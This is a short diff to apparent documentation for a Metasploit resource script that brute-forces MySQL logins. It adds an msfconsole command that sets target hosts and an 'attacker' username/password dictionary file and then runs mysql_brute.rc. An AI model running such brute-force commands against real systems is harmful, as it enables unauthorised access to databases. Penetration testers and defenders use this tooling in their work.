@@ -45,6 +45,10 @@
 
       msfconsole -q -x 'setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'
 
+- instruct the resource script to scan rhosts input by attacker, and use the attacker dicionary file 
+
+      msfconsole -q -x 'setg RHOSTS 10.10.10.1 10.10.11.2;setg USERPASS_FILE /root/dicionary.txt;resource /root/mysql_brute.rc'
+
 
 
 <br />
